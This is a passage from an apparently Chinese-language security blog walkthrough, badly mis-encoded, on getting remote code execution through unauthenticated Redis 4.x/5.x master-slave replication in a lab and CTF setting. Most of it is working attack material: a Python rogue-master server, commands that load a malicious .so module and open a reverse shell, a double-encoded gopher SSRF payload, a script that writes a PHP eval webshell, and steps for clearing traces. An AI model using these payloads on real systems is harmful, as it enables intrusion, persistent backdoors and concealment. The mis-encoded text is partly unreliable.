ç­‰å¾…REPLCONFè¿”å› */ #define REPL_STATE_SEND_PSYNC 10 /* å‘é€PSYNC */ #define REPL_STATE_RECEIVE_PSYNC 11 /* ç­‰å¾…PSYNCè¿”å› */ /* --- æ¡æ‰‹çŠ¶æ€ç»“æŸ --- */ #define REPL_STATE_TRANSFER 12 /* æ­£åœ¨ä»masteræ¥æ”¶RDBæ–‡ä»¶ */ è¿™é‡Œçš„é‡ç‚¹å°±æ˜¯åˆ©ç”¨å…¨é‡å¤åˆ¶å°†masterä¸Šçš„RDBæ–‡ä»¶åŒæ­¥åˆ°slaveä¸Šï¼Œä¹Ÿå°±æ˜¯å°†æˆ‘ä»¬çš„æ¶æ„soæ–‡ä»¶ä¼ è¾“åˆ°slaveä¸Šï¼Œä»è€Œè¾¾åˆ°åŠ è½½æ¶æ„soæ–‡ä»¶è¾¾åˆ°rceã€‚ é‚£ä¸ºä»€ä¹ˆä¸€å®šæ˜¯å…¨é‡å¤åˆ¶å‘¢ï¼Œç†ç”±å¦‚ä¸‹ï¼Œå½“slaveå‘masterå‘é€PSYNCå‘½ä»¤ä¹‹åï¼Œä¸€èˆ¬ä¼šå¾—åˆ°ä¸‰ç§å›å¤ï¼š +FULLRESYNCï¼šè¿›è¡Œå…¨é‡å¤åˆ¶ã€‚ +CONTINUEï¼šè¿›è¡Œå¢é‡åŒæ­¥ã€‚ -ERRï¼šå½“å‰masterè¿˜ä¸æ”¯æŒPSYNCã€‚ å…¨é‡å¤åˆ¶çš„è¿‡ç¨‹ slaveå‘masterå‘é€PSYNCè¯·æ±‚ï¼Œå¹¶æºå¸¦masterçš„runidå’Œoffestï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è¿æ¥çš„è¯slaveä¸çŸ¥é“masterçš„runidï¼Œæ‰€ä»¥ä¼šè¿”å›runidä¸º?ï¼Œoffestä¸º-1ï¼Œæˆ‘ä»¬æ¥æµ‹è¯•ä»¥ä¸‹çœ‹çœ‹æ˜¯ä¸æ˜¯çœŸçš„å¦‚æ­¤ è¿™é‡Œæˆ‘ä»¬å…ˆå¯¹6379çš„redisè¾“å…¥slave no oneï¼Œè§£é™¤ä»–ä¸6380redisä¹‹é—´çš„ä¸»ä»å…³ç³»ï¼Œæ¥ç€kaliå¼€å¯ç›‘å¬ï¼Œåœ¨6379ä¸Šè®¾ç½®kaliä¸ºredisçš„ä¸»æœåŠ¡å™¨ è¿™é‡Œæˆ‘æ“ä½œå¤±è¯¯äº†ï¼Œè¿æ¥ç¬¬äºŒæ¬¡æˆ‘æ‰ææ‡‚å¾—å¹²å˜›ã€‚ã€‚ã€‚ä¼¼ä¹å°±æ˜¯redisè¿æ¥ä½ ä¹‹åï¼Œä½ éœ€è¦å›å¤æŒ‡å®šå‘½ä»¤ä¸å…¶è¿›è¡Œé€šä¿¡ï¼Œæœ€åè¿”å›masterçš„runidå’Œoffestï¼Œå³ï¼š ä¸»æœåŠ¡å™¨éœ€è¦æ‰§è¡Œçš„å“åº”å†…å®¹å¦‚ä¸‹: [&gt;] PING â€“ ä»æœåŠ¡å™¨æ¢æµ‹ä¸»æœåŠ¡å™¨æ˜¯å¦å­˜æ´» [&lt;] +PONG å­˜æ´»å“åº” [&gt;] REPLCONF â€“ äº¤æ¢ä¸»ä»èŠ‚ç‚¹å¤åˆ¶ä¿¡æ¯ [&lt;] +OK ç¡®è®¤ [&gt;] PSYNC/SYNC â€“ åŒæ­¥çŠ¶æ€ä»¥åŠä¼ è¾“æ–¹å¼ [&lt;] +FULLRESYNC åŒæ­¥æ•°æ® æ­£ç¡®çš„åº”è¯¥æ˜¯è¿™æ · è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š masteréªŒè¯slaveå‘æ¥çš„runidæ˜¯å¦å’Œè‡ªèº«runidä¸€è‡´ï¼Œå¦‚ä¸ä¸€è‡´ï¼Œåˆ™è¿›è¡Œå…¨é‡å¤åˆ¶ã€‚ masteræŠŠè‡ªå·±çš„runidå’Œoffsetå‘ç»™slaveï¼Œslaveå¯¹masterå‘æ¥çš„runidå’Œoffestè¿›è¡Œä¿å­˜ masterè¿›è¡Œbgsaveï¼Œç”ŸæˆRDBæ–‡ä»¶ masterå°†å†™å¥½çš„RDBæ–‡ä»¶ä¼ è¾“ç»™slaveï¼Œå¹¶å°†ç¼“å†²åŒºå†…çš„æ•°æ®ä¼ è¾“ç»™slave slaveåŠ è½½RDBæ–‡ä»¶å’Œç¼“å†²åŒºæ•°æ® å¢é‡å¤åˆ¶ï¼ˆéƒ¨åˆ†å¤åˆ¶ï¼‰ å¢é‡å¤åˆ¶çš„è¿‡ç¨‹è¿™é‡Œç®€å•å¸¦è¿‡ä¸€ä¸‹ï¼šå°±æ˜¯å½“slaveå‘masterè¦æ±‚æ•°æ®åŒæ­¥æ—¶ï¼Œä¼šå‘é€masterçš„runidå’Œoffestï¼Œå¦‚æœrunidå’Œslaveä¸Šçš„ä¸å¯¹åº”åˆ™ä¼šè¿›è¡Œå…¨é‡å¤åˆ¶ï¼Œå¦‚æœç›¸åŒåˆ™è¿›è¡Œæ•°æ®åŒæ­¥ï¼Œä½†æ˜¯ä¸ä¼šä¼ è¾“RDBæ–‡ä»¶ é€šè¿‡äº†è§£å…¨é‡å¤åˆ¶å’Œå¢é‡å¤åˆ¶çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬åº”è¯¥å¤§è‡´çŸ¥é“ä¸ºä»€ä¹ˆä¸€å®šè¦ç”¨å…¨é‡å¤åˆ¶è€Œä¸ç”¨å¢é‡å¤åˆ¶äº†ã€‚ ä½†æ˜¯è¿™æ ·æˆ‘æ„Ÿè§‰è¿˜æ˜¯æ¬ ç‚¹ä»€ä¹ˆï¼Œå› ä¸ºæˆ‘è®¤ä¸ºæˆ‘æ²¡æœ‰å®Œå…¨ææ‡‚ï¼Œåˆæ‰¾äº†å‡ ç¯‡æ–‡ç« å‘ç°è¿™ä¸ªè§£é‡Šçš„å¾ˆå¥½ï¼š Redisæä¾›äº†2ç§ä¸åŒçš„æŒä¹…åŒ–æ–¹å¼ï¼ŒRDBæ–¹å¼ï¼ˆåœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…ç”Ÿæˆæ•°æ®é›†çš„æ—¶é—´ç‚¹å¿«ç…§ï¼‰å’ŒAOFæ–¹å¼ï¼ˆè®°å½•æœåŠ¡å™¨æ‰§è¡Œçš„æ‰€æœ‰å†™æ“ä½œå‘½ä»¤ï¼‰.AOFæ–¹å¼å¤‡ä»½æ•°æ®åº“çš„æ–‡ä»¶åé»˜è®¤ä¸ºappendonly.aofï¼Œå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­é€šè¿‡ä¿®æ”¹appendfilenameå‚æ•°è¿›è¡Œä¿®æ”¹ï¼Œæ— æ³•åœ¨å®¢æˆ·ç«¯äº¤äº’ä¸­åŠ¨æ€è®¾ç½®appendfilenameï¼Œè€ŒRDBæ–¹å¼å¤‡ä»½æ•°æ®åº“çš„æ–‡ä»¶åé»˜è®¤ä¸ºdump.rdbï¼Œæ­¤æ–‡ä»¶åå¯ä»¥é€šè¿‡å®¢æˆ·ç«¯äº¤äº’åŠ¨æ€è®¾ç½®dbfilenameæ¥æ›´æ”¹ã€‚ è¿™ä¹Ÿè¯´æ˜äº†æˆ‘ä»¬ä¸ºä½•è¦é€‰æ‹©RDBæ–¹å¼äº†ã€‚ ä¸Šå›¾å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥ä»»æ„è®¾ç½®RDBæ–‡ä»¶åï¼Œä½†å¯¹äºAOFå´ä¸è¡Œï¼Œè€Œé‡ç‚¹å¦‚ä¸‹ï¼š ä¸»ä»å¤åˆ¶æ¨¡å¼ä¸‹æ•°æ®å•å‘ä»ä¸»èŠ‚ç‚¹æµå‘ä»èŠ‚ç‚¹ï¼Œåœ¨ä»èŠ‚ç‚¹é¦–æ¬¡æ³¨å†Œæ—¶ï¼Œä¼šå¯¹ä¸»èŠ‚ç‚¹æ•°æ®è¿›è¡Œå…¨é‡å¤åˆ¶ï¼Œå¤åˆ¶è¿‡ç¨‹ä¸­ç”¨offsetè®°å½•è¯»å–çš„æ•°æ®å¤§å°ï¼Œä»¥ä¾¿ä¸­æ–­åæ–­ç‚¹ç»­ä¼ ã€‚å¦‚æœä»èŠ‚ç‚¹åˆå§‹æ²¡æœ‰æ•°æ®ï¼Œé€šè¿‡ä¸»ä»å¤åˆ¶ï¼Œå¯ä»¥å°†ä¸»èŠ‚ç‚¹è®¾ç½®çš„dbfilenameæ–‡ä»¶å…¨é‡å¤åˆ¶åˆ°ä»èŠ‚ç‚¹çš„dbfilenameä¸­ï¼Œä»è€Œå®ç°ä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚ è¿™ä¹Ÿå°±è¯´æ˜äº†ï¼Œæ”»å‡»çš„æ—¶å€™ä¼¼ä¹åªèƒ½ä¸€æ¬¡æˆåŠŸå—ï¼Ÿæ¯•ç«Ÿå¦‚æœç¬¬äºŒæ¬¡è¿æ¥å°±ä¸æ˜¯é¦–æ¬¡æ³¨å†Œäº†ã€‚ã€‚ã€‚ ä¸è¿‡åŸç†ç®—æ˜¯å½»åº•æ˜ç™½äº† æ”»å‡»æµç¨‹ ç¬¬ä¸€ä¸ªå°±æ˜¯å…ˆé…ç½®ä¸€ä¸ªæ”»å‡»æœåŠ¡å™¨ï¼Œè¿™ä¸ªæœåŠ¡å™¨æ˜¯ç”¨äºè¢«å—å®³è€…redisæœåŠ¡å™¨è¿æ¥çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„é¶æœºä¸ºä»æœåŠ¡å™¨ï¼Œæ”»å‡»æœºä¸ºä¸»æœåŠ¡å™¨ï¼ˆè€Œæ¶æ„soæ–‡ä»¶å°±åœ¨æˆ‘ä»¬çš„æ”»å‡»æœºä¸Šï¼‰ è€Œæ”»å‡»æœºåœ¨äºredisäº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å‘é€å¦‚ä¸‹ä¿¡æ¯ï¼š PING æµ‹è¯•è¿æ¥æ˜¯å¦å¯ç”¨ +PONG å‘Šè¯‰slaveè¿æ¥å¯ç”¨ REPLCONF å‘é€REPLCONFä¿¡æ¯ï¼Œä¸»è¦æ˜¯å½“å‰å®ä¾‹ç›‘å¬ç«¯å£ +OK å‘Šè¯‰slaveæˆåŠŸæ¥å— REPLCONF å‘é€REPLCONF capa +OK å‘Šè¯‰slaveæˆåŠŸæ¥å— PSYNC &lt;rundi&gt; &lt;offest&gt; å‘é€PSYNC è¿™é‡Œæ ·çš„è¯æ‰ç®—æˆåŠŸçš„å†’å……ä¸ºäº†ä¸€ååˆæ ¼çš„redisä¸»æœåŠ¡å™¨ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šè¿™é‡Œæˆ‘å°±å€Ÿç”¨äº†~~ è€Œæ­¤æ—¶çš„redisä»æœåŠ¡å™¨éœ€è¦ä¸»åŠ¨çš„å‘é€å¦‚ä¸‹ä¿¡æ¯ï¼ˆå®é™…å°±æ˜¯æˆ‘ä»¬æ“æ§å®ƒå‘é€ï¼‰ Config set dir ./ è®¾ç½®redisçš„å¤‡ä»½è·¯å¾„ä¸ºå½“å‰ç›®å½• Config set dbfilename test.so ä¿®æ”¹å¤‡ä»½æ–‡ä»¶å SLAVEOF host port è®¾ç½®ä¸ºå¯¹åº”æœåŠ¡å™¨çš„ä»èŠ‚ç‚¹ MODULE LOAD ./test.so åŠ è½½å¤åˆ¶è¿‡æ¥çš„ SLAVEOF no one å…³é—­ä¸»ä»å¤åˆ¶å…³ç³»(é˜²æ­¢è„æ•°æ®å¤åˆ¶) System.exec â€˜commandâ€™ æ‰§è¡Œå‘½ä»¤ ä»»æ„æ–‡ä»¶å†™å…¥ è¿™é‡Œå‘¢ï¼Œæˆ‘æ˜¯å…ˆé…ç½®çš„redisæœåŠ¡å¯¹å¤–å¼€æ”¾6379ç«¯å£ï¼Œssrfåç»­å†è¯´ï¼Œè¿™é‡Œå¼€å¯ä¹‹åå‘¢ï¼Œæˆ‘å¹¶æ²¡æœ‰å¯¹redisè®¾ç½®ç™»å½•å¯†ç ï¼Œä½†åŒæ—¶è¦è®¾ç½®å–æ¶ˆä¿æŠ¤æ¨¡å¼ï¼ŒåŒæ—¶å¯¹äºç›‘å¬æœ¬åœ°127.0.0.1çš„é‚£ä¸€è¡Œéœ€è¦æ³¨é‡Šæ‰ æ¥ä¸‹æ¥æˆ‘ä»¬kaliè¿æ¥æµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°èƒ½æˆåŠŸè¿æ¥ è¿™é‡Œçš„è¯å…ˆè¿æ¥ä¸Šredis-serverï¼Œä¹‹åè®¾ç½®å¤‡ä»½æ–‡ä»¶ç›®å½•ï¼Œä»¥åŠå¤‡ä»½æ–‡ä»¶åï¼Œç„¶åæ‰§è¡Œslaveofä½¿å…¶æˆä¸ºæˆ‘ä»¬æ¶æ„æœåŠ¡çš„ä»redisï¼Œæ¶æ„ master åœ¨æ¥æ”¶åˆ° redis-server çš„ PSYNC å‘½ä»¤åï¼Œè¿”å› FULLRESYNC å‘½ä»¤ï¼Œå¹¶å°† payload ç´§è·Ÿç€å‘é€ã€‚æœ€ç»ˆ payload è¢«å†™åˆ° redis-server çš„ /var/www/html/exp.txt å½“ä¸­ æ¶æ„masterå¦‚ä¸‹ import os import sys import argparse import socketserver import logging import socket import time logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='&gt;&gt; %(message)s') DELIMITER = b\"\\r \" class RoguoHandler(socketserver.BaseRequestHandler): def decode(self, data): if data.startswith(b'*'): return data.strip().split(DELIMITER)[2::2] if data.startswith(b'$'): return data.split(DELIMITER, 2)[1] return data.strip().split() def handle(self): while True: data = self.request.recv(1024) print(data) logging.info(\"receive data: %r\", data) arr = self.decode(data) if arr[0].startswith(b'PING'): self.request.sendall(b'+PONG' + DELIMITER) elif arr[0].startswith(b'REPLCONF'): self.request.sendall(b'+OK' + DELIMITER) elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'): self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER) self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER) self.request.sendall(self.server.payload + DELIMITER) break self.finish() def finish(self): self.request.close() class RoguoServer(socketserver.TCPServer): allow_reuse_address = True def __init__(self, server_address, payload): super(RoguoServer, self).__init__(server_address, RoguoHandler, True) self.payload = payload if __name__=='__main__': expfile = '/home/hybcx/flag.txt' #æˆ‘ä»¬è¦ä¼ è¾“çš„æ¶æ„æ–‡ä»¶çš„è·¯å¾„ lport = 6666 with open(expfile, 'rb') as f: server = RoguoServer(('0.0.0.0', lport), f.read()) print(\"[+] listening ......\") server.handle_request() print(\"[+] completed ~~~\") ä¹‹åç°åœ¨kaliä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š é…ç½®å¥½ä¹‹åï¼Œæˆ‘ä»¬å¼€å¯æ¶æ„master å½“å…¶è¿è¡Œç»“æŸåï¼Œæˆ‘ä»¬åœ¨é¶æœºä¸Šå³å¯æŸ¥çœ‹åˆ°flag.txtè¢«å†™å…¥ã€‚è¿™é‡Œè‚¯å®šæƒ³ç€ä¸ºä½•kaliä¸Šæ‰§è¡Œä¸ªpyå°±å†™å…¥äº†å‘¢ï¼Œå› ä¸ºåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å·²ç»å°†æˆ‘ä»¬çš„æ¶æ„masterè®¾ç½®ä¸ºäº†ä¸»redisï¼Œé‚£æˆ‘ä»¬åœ¨å…¶ä¸­çš„ä»»ä½•æ“ä½œï¼Œéƒ½å¯ä»¥åŒæ­¥åˆ°ä»redisï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„é¶æœºï¼Œæˆ‘ä»¬è¿™é‡Œçš„pyé€»è¾‘å°±æ˜¯ä¸ä»æœåŠ¡å™¨å‘½ä»¤äº¤äº’å®Œï¼Œç›´æ¥å‘é€payloadï¼Œé€ æˆæ–‡ä»¶ä¸Šä¼  å®é™…ä¸Šç»†ç»†ç ”ç©¶å‘ç°è¿™é‡Œä¼¼ä¹å­˜åœ¨ä¸€ä¸ªæ—¶é—´é—®é¢˜ï¼Œæ¯”å¦‚æˆ‘æ—©å°±åœ¨ä»redisä¸Šé…ç½®å¥½äº†æˆ‘ä¸»redisçš„ipå³ç«¯å£ï¼Œä½†æ­¤æ—¶ä¸»redisè¿˜æ²¡å¼€å¯ï¼Œæ˜¯ä¼‘çœ çŠ¶æ€ï¼Œä½†ä¸€å½“æˆ‘å¼€å¯ä¸»redisï¼Œä»rediså°±ä¼šå‘ä¸»rediså‘é€PINGå‘½ä»¤ï¼Œç­‰å¾…å…·ä½“çš„å›å¤ï¼Œç©¶ç«Ÿæ˜¯è¦è¿›è¡Œå…¨é‡å¤åˆ¶ï¼Œè¿˜æ˜¯å¢é‡å¤åˆ¶ç­‰ç­‰ç­‰ç­‰ã€‚è€Œæˆ‘ä»¬ä¸Šè¿°çš„æ¶æ„masterä¼šåœ¨ä»rediså‘é€ç»™æˆ‘ä»¬PINGå‘½ä»¤ä¹‹åç»™äºˆç›¸å…³çš„å›åº”ï¼Œæœ€åå‘é€ç»™ä»redisè¿›è¡Œå…¨é‡å¤åˆ¶çš„å‘½ä»¤ï¼Œæœ€ç»ˆå¯¼è‡´æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ä¸Šä¼ æ•ˆæœã€‚ redisåŠ è½½æ¶æ„.so è¿™é‡Œæ€è·¯å¤§è‡´ä¸ä¸Šè¿°ä¸€ç›´ï¼Œè¿™é‡Œæˆ‘ä»¬æ”¹ä¸€ä¸‹é…ç½®å³å¯ï¼ˆæ³¨æ„è¿™é‡Œä¾æ—§æ˜¯åˆ©ç”¨redisæœªæˆæƒï¼‰ #è®¾ç½®redisçš„å¤‡ä»½è·¯å¾„ä¸ºå½“å‰ç›®å½• config set dir ./ #è®¾ç½®å¤‡ä»½æ–‡ä»¶åä¸ºexp.soï¼Œé»˜è®¤ä¸ºdump.rdb config set dbfilename exp.so #è®¾ç½®ä¸»æœåŠ¡å™¨IPå’Œç«¯å£ slaveof 192.168.172.129 1234 #åŠ è½½æ¶æ„æ¨¡å— module load ./exp.so #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ system.exec 'whoami' system.rev 127.0.0.1 9999 å¦‚å›¾æ‰€ç¤ºï¼Œé…ç½®å¥½åæˆ‘ä»¬å¼€å¯æ¶æ„masterï¼Œä½†è¿™é‡Œä¸çŸ¥é“ä¸ºä½•è®¾ç½®å¤‡ä»½ç›®å½•ä¸ºå½“å‰çš„æ—¶å€™ä¸æˆåŠŸã€‚ã€‚ã€‚å°±å…ˆè®¾ç½®tmpäº† import os import sys import argparse import socketserver import logging import socket import time logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='&gt;&gt; %(message)s') DELIMITER = b\"\\r \" class RoguoHandler(socketserver.BaseRequestHandler): def decode(self, data): if data.startswith(b'*'): return data.strip().split(DELIMITER)[2::2] if data.startswith(b'$'): return data.split(DELIMITER, 2)[1] return data.strip().split() def handle(self): while True: data = self.request.recv(1024) print(data) logging.info(\"receive data: %r\", data) arr = self.decode(data) if arr[0].startswith(b'PING'): self.request.sendall(b'+PONG' + DELIMITER) elif arr[0].startswith(b'REPLCONF'): self.request.sendall(b'+OK' + DELIMITER) elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'): self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER) self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER) self.request.sendall(self.server.payload + DELIMITER) break self.finish() def finish(self): self.request.close() class RoguoServer(socketserver.TCPServer): allow_reuse_address = True def __init__(self, server_address, payload): super(RoguoServer, self).__init__(server_address, RoguoHandler, True) self.payload = payload if __name__=='__main__': expfile = '/home/hybcx/Tools/redis-rogue-getshell/exp.so' #æˆ‘ä»¬è¦ä¼ è¾“çš„æ¶æ„æ–‡ä»¶çš„è·¯å¾„ lport = 6666 with open(expfile, 'rb') as f: server = RoguoServer(('0.0.0.0', lport), f.read()) print(\"[+] listening ......\") server.handle_request() print(\"[+] completed ~~~\") è®°å¾—ä¿®æ”¹æ¶æ„æ–‡ä»¶è·¯å¾„å—ï¼Œå¦‚ä¸‹å›¾è¿è¡Œä¹‹åæ‰§è¡Œsystemå‘½ä»¤æˆåŠŸ SSRFè¿›è¡ŒredisåŠ è½½.so è¿™é‡Œè™½ç„¶è¿›è¡Œäº†ä¸Šè¿°çš„å®æ“ï¼Œä½†æ„Ÿè§‰ä¸å¤ŸçœŸå®ï¼Œæ¯•ç«Ÿæ„Ÿè§‰ç°å®ä¸­å­˜åœ¨ssrfçš„æ¦‚ç‡æ‰æ˜¯å¤§çš„ï¼Œè™½ç„¶å¯ä»¥çˆ†ç ´å¼±å£ä»¤ï¼Œä½†æ€»æ„Ÿè§‰å°‘ç‚¹ä»€ä¹ˆã€‚è€Œä¸”è¿™é‡Œçš„ssrfæ”»å‡»çš„è¿‡ç¨‹ä¸€ç›´æ²¡ææˆåŠŸï¼Œç°åœ¨å†æ¥æä¸€ä¸‹ã€‚ è¿™é‡Œæˆ‘ä»¬å…ˆå–æ¶ˆredisçš„ä¸»ä»å…³ç³»ï¼Œå¹¶ä¸”é‡æ–°é…ç½®æ–‡ä»¶ï¼Œå¼€å¯ç›®æ ‡redisçš„ä¿æŠ¤æ¨¡å¼ï¼Œä»¥åŠåªè®©å…¶ç›‘å¬æœ¬åœ°127.0.0.1ã€‚ ä¹‹åé‡å¯redisæœåŠ¡ ç¡®å®šä¸€ä¸‹å¯¹æ–¹æœåŠ¡çš„é…ç½®ï¼Œç°åœ¨æˆ‘ä»¬è¿›è¡Œæ„é€ æ¶æ„å‘½ä»¤ #ç¬¬ä¸€æ¬¡æ”»å‡» config set dir /tmp config set dbfilename exp.so slaveof 192.168.246.130 6666 #ç¬¬äºŒæ¬¡æ”»å‡» module load /tmp/exp.so system.exec \"id\" åœ¨è¿™é‡Œåˆ†ä¸¤æ¬¡æ˜¯å› ä¸ºç¬¬ä¸€æ¬¡æˆ‘ä»¬åœ¨ä¼ å…¥å‘½ä»¤ä¹‹åï¼Œexp.soè¿˜æœªè¢«åŠ è½½ï¼Œä¹‹åç¬¬äºŒæ¬¡æ‰è¾“å…¥çš„åŠ è½½æŒ‡ä»¤ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åˆå¹¶ä¸Šè¿°ä¸¤ä¸ªpayloadï¼Œç„¶åå‘é€ä¸¤æ¬¡ã€‚ gopher://127.0.0.1:6379/_config%2520set%2520dir%2520/tmp%250D%250Aconfig%2520set%2520dbfilename%2520exp.so%250D%250Aslaveof%2520192.168.246.130%25206666%250D%250Amodule%2520load%2520/tmp/exp.so%250D%250Asystem.exec%2520%2522id%2522%250D%250A è¿™é‡Œè¿›è¡Œäº†ä¸¤æ¬¡ç¼–ç ï¼Œä½†æ˜¯åœ¨æˆ‘å‘é€ä¸¤æ¬¡ä¹‹åé¡µé¢å¹¶æ²¡æœ‰å›æ˜¾ï¼Œä¸çŸ¥é“æ˜¯å¦æ˜¯é…ç½®é—®é¢˜ï¼Œä½†åœ¨é¶æœºä¸Šæµ‹è¯•å¦‚ä¸‹ï¼Œå‘ç°æ˜¯æˆåŠŸåŠ è½½çš„ è¿™è®©æˆ‘çªç„¶è¿·æƒ‘äº†ï¼Œæ˜¯å¦æˆ‘å¤ªè¿‡é’»ç‰›è§’å°–äº†ï¼Œæœ¬æ¥å¦‚æœè¿™é‡Œå­˜åœ¨ssrfçš„è¯ï¼Œæˆ‘ä»¬æœ¬å°±å¯ä»¥è¿›è¡Œå†™å…¥å…¬é’¥ï¼Œå†™webshellç­‰ç­‰ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å®Œå…¨å°±å¯ä»¥è¿æ¥ä¸Šå¯¹æ–¹redisæœåŠ¡ï¼Œè¿™æ ·çš„è¯å°±æ²¡å¿…è¦éå¾—åˆ©ç”¨ssrfæ¥rceäº†ã€‚è¿™é‡Œçš„ç–‘æƒ‘è¿˜æ˜¯é€šè¿‡ä¸€ä¼šå„¿çš„åšé¢˜æ¥æ„Ÿå—å§ã€‚ã€‚ã€‚ ç—•è¿¹æ¸…é™¤ ä¸ºäº†å‡å°‘å¯¹æœåŠ¡å™¨çš„å½±å“ï¼Œæ”»å‡»å®Œæˆåï¼Œåº”è¯¥å°½é‡æ¸…é™¤ç—•è¿¹ï¼Œéœ€è¦æ¢å¤ç›®å½•å’Œæ•°æ®åº“æ–‡ä»¶ï¼Œå¸è½½åŒæ—¶åˆ é™¤æ¨¡å—ï¼Œè€Œæ•°æ®åŸæœ¬çš„é…ç½®ä¿¡æ¯ï¼Œéœ€è¦åœ¨æ”»å‡»ä¹‹å‰è¿›è¡Œå¤‡ä»½ã€‚ CONFIG get * # è·å–æ‰€æœ‰çš„é…ç½® CONFIG get dir # è·å– å¿«ç…§æ–‡ä»¶ ä¿å­˜çš„ ä½ç½® CONFIG get dbfilename # è·å– å¿«ç…§æ–‡ä»¶ çš„æ–‡ä»¶å #åˆ‡æ–­ä¸»ä»ï¼Œå…³é—­å¤åˆ¶åŠŸèƒ½ slaveof no one #æ¢å¤ç›®å½• config set dir /data #é€šè¿‡dump.rdbæ–‡ä»¶æ¢å¤æ•°æ® config set dbfilename dump.rdb #åˆ é™¤exp.so system.exec 'rm ./exp.so' #å¸è½½systemæ¨¡å—çš„åŠ è½½ module unload system æ¼æ´åˆ©ç”¨çš„ç‰ˆæœ¬æ˜¯redis 4.x/5.x ï¼Œå¦‚æœæ˜¯å…ˆå‰ç‰ˆæœ¬çš„Redisï¼Œåˆ™æ— æ³•åŠ è½½æ¨¡å—ï¼Œè‡ªç„¶ä¹Ÿå°±æ— æ³•åˆ©ç”¨ã€‚åœ¨ç½‘ä¸Šå¼€äº†å‡ ä¸ªå¼€æºçš„åˆ©ç”¨è„šæœ¬ï¼Œéƒ½æ²¡æœ‰è¿›è¡Œç‰ˆæœ¬çš„åˆ¤æ–­ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨expï¼Œé™¤äº†æ”»å‡»å¤±è´¥å¤–ï¼Œå¯èƒ½ä¼šä¿®æ”¹äº† dir å’Œdbfilename ï¼Œè¿™äº›éƒ½å¯ä»¥é€šè¿‡redisæœªæˆæƒä¿®æ”¹å›åŸæ¥çš„é…ç½®ï¼ˆå‰ææ˜¯æœ‰æå‰å¤‡ä»½ï¼‰ï¼Œè€Œç›®å½•ä¸‹ä¼šå¤šç”Ÿæˆä¸€ä¸ª exp.soæ–‡ä»¶ã€‚ 0x06 é¢˜ç›®å®æˆ˜ CTFHUB-SSRF-redisåè®® çœ‹åˆ°urlï¼Œé‚£å¼€å§‹æµ‹è¯• å‘ç°å­˜åœ¨6379çš„redisæœåŠ¡ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦å¯¹æ–¹redisè®¾ç½®äº†å¯†ç ï¼Œè„šæœ¬è·‘ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾ï¼Œå‘ç°æ²¡æœ‰è®¾ç½® é‚£è¿™é‡Œæˆ‘æƒ³çš„å°±æ˜¯å…ˆå°è¯•å†™webshellï¼Œè¯ä¸å¤šè¯´ç›´æ¥ä¸Šè„šæœ¬ import urllib protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"6379\" shell=\" &lt;?php eval($_GET[\\\"cmd\\\"]);?&gt; \" filename=\"shell.php\" path=\"/var/www/html\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r \" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print urllib.quote(payload) py2è¿è¡Œï¼Œè¿™é‡Œéœ€è¦ä¸¤æ¬¡urlç¼–ç  gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%25 5D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A ç›´æ¥urlä¸Šä¼ ï¼Œä¹‹åè®¿é—®shell.php æˆåŠŸä¸Šä¼ å¹¶æ‹¿åˆ°flag Redis 4.x/5.xä¸»ä»å¤åˆ¶RCE å¤ç°åœ°å€ï¼šhttps://vulhub.org/#/environments/redis/4-unacc/ ç›´æ¥vulhubä¸€é”®å¯åŠ¨é¶æœºï¼Œä¹‹åkaliå°è¯•è¿æ¥ç›®æ 